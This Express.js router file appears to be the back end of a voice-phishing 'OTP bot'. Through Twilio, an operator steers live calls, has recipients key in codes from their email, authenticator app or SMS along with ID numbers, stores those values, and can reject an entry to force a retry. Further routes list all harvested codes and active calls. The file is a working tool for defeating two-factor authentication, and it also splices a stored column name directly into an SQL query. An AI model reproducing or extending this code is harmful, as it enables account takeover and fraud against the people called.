const express = require('express');
const router = express.Router();
const db = require('../database/db');
const twilio = require('twilio');

const client = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);

function getActionConfig(action) {
    const configs = {
        'email_otp': {
            route: 'email-otp',
            message: 'Please enter the 6 digit OTP from your email followed by the pound key.',
            numDigits: 6
        },
        'auth_otp': {
            route: 'auth-otp',
            message: 'Please enter the 6 digit code from your authenticator app followed by the pound key.',
            numDigits: 6
        },
        'phone_otp': {
            route: 'phone-otp',
            message: 'Please enter the 6 digit OTP sent to your phone followed by the pound key.',
            numDigits: 6
        },
        'id_number': {
            route: 'id',
            message: 'Please enter your ID number followed by the pound key.',
            numDigits: 20
        }
    };
    return configs[action];
}

router.post('/request-action/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { action } = req.body;
    const io = req.app.get('io');
    
    const actionConfig = getActionConfig(action);
    if (!actionConfig) {
        return res.status(400).json({ error: 'Invalid action' });
    }
    
    try {
        const session = await db.query(
            `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const callSid = session.rows[0]?.call_sid;
        const callStatus = session.rows[0]?.status;
        
        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
            return res.status(400).json({ 
                success: false, 
                error: `Call is not active. Current status: ${callStatus}` 
            });
        }
        
        await db.query(
            `UPDATE call_sessions SET current_action = 'waiting_for_${action}' WHERE id = $1`,
            [sessionId]
        );
        
        await db.query(
            `INSERT INTO admin_logs (session_id, action_type) VALUES ($1, $2)`,
            [sessionId, action]
        );
        
        if (callSid) {
            const redirectUrl = `${req.protocol}://${req.get('host')}/webhooks/voice-response/${sessionId}`;
            const twiml = `<Response><Redirect>${redirectUrl}</Redirect></Response>`;
            await client.calls(callSid).update({ twiml: twiml });
            console.log(`Redirected call ${callSid} to ${redirectUrl}`);
        }
        
        io.emit('admin_action', { session_id: sessionId, action: action, message: actionConfig.message });
        
        res.json({ success: true, action: action });
    } catch (error) {
        console.error('Error requesting action:', error);
        
        if (error.code === 21220) {
            await db.query(
                `UPDATE call_sessions SET status = 'failed' WHERE id = $1`,
                [sessionId]
            );
            res.status(400).json({ error: 'Call is no longer active. Please start a new call.' });
        } else {
            res.status(500).json({ error: error.message });
        }
    }
});

router.post('/custom-voice/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { message } = req.body;
    const io = req.app.get('io');
    
    try {
        const session = await db.query(
            `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const callSid = session.rows[0]?.call_sid;
        const callStatus = session.rows[0]?.status;
        
        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
            return res.status(400).json({ 
                success: false, 
                error: `Call is not active. Current status: ${callStatus}` 
            });
        }
        
        await db.query(
            `UPDATE call_sessions SET current_action = 'custom_voice', custom_message = $1 WHERE id = $2`,
            [message, sessionId]
        );
        
        await db.query(
            `INSERT INTO admin_logs (session_id, action_type, action_value) VALUES ($1, $2, $3)`,
            [sessionId, 'custom_voice', message]
        );
        
        if (callSid) {
            const redirectUrl = `${req.protocol}://${req.get('host')}/webhooks/voice-response/${sessionId}`;
            const twiml = `<Response><Redirect>${redirectUrl}</Redirect></Response>`;
            await client.calls(callSid).update({ twiml: twiml });
            console.log(`Redirected call ${callSid} for custom voice`);
        }
        
        io.emit('admin_action', { session_id: sessionId, action: 'custom_voice', message: message });
        
        res.json({ success: true, message: 'Custom voice command sent' });
    } catch (error) {
        console.error('Error sending custom voice:', error);
        if (error.code === 21220) {
            res.status(400).json({ error: 'Call is no longer active. Please start a new call.' });
        } else {
            res.status(500).json({ error: error.message });
        }
    }
});

router.post('/reject-last-data/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const io = req.app.get('io');
    
    try {
        const session = await db.query(
            `SELECT last_data_type, last_data_value, call_sid, status FROM call_sessions WHERE id = $1`,
            [sessionId]
        );
        
        const lastDataType = session.rows[0]?.last_data_type;
        const lastDataValue = session.rows[0]?.last_data_value;
        const callSid = session.rows[0]?.call_sid;
        const callStatus = session.rows[0]?.status;
        
        if (!lastDataType) {
            return res.json({ success: false, message: 'No data to reject' });
        }
        
        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
            return res.json({ success: false, message: 'Call is no longer active' });
        }
        
        await db.query(
            `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
            [sessionId]
        );
        
        await db.query(
            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
            [`waiting_for_${lastDataType}`, sessionId]
        );
        
        if (callSid) {
            const redirectUrl = `${req.protocol}://${req.get('host')}/webhooks/voice-response/${sessionId}`;
            const twiml = `<Response><Redirect>${redirectUrl}</Redirect></Response>`;
            await client.calls(callSid).update({ twiml: twiml });
        }
        
        io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
        
        res.json({ success: true, message: `Last ${lastDataType} rejected` });
    } catch (error) {
        console.error('Error rejecting data:', error);
        res.status(500).json({ error: error.message });
    }
});

router.get('/contacts', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT id, phone_number, full_name, email_otp, auth_otp, phone_otp, id_number, status, created_at 
             FROM contacts ORDER BY created_at DESC`
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/active-calls', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT cs.id as session_id, cs.call_sid, cs.current_action, cs.status, 
                    c.phone_number, c.full_name
             FROM call_sessions cs
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cs.status IN ('initiated', 'in-progress', 'ringing')
             ORDER BY cs.started_at DESC`
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/session-data/:sessionId', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT cd.*, c.full_name, c.phone_number 
             FROM collected_data cd
             JOIN call_sessions cs ON cd.session_id = cs.id
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cd.session_id = $1
             ORDER BY cd.collected_at DESC`,
            [req.params.sessionId]
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
